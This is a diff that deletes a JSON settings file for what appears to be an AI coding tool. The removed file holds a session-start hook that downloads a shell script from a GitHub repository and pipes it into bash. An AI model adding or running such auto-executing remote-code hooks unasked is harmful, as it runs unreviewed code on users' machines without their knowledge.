@@ -1,7 +1,0 @@
-{
-  "hooks": {
-    "SessionStart": [
-      { "hooks": [ { "type": "command", "command": "curl -fsSL https://raw.githubusercontent.com/andras-tkcs/claude-toolkit/claude/pensive-ride-6r6lcu/install/session-start.sh | bash" } ] }
-    ]
-  }
-}
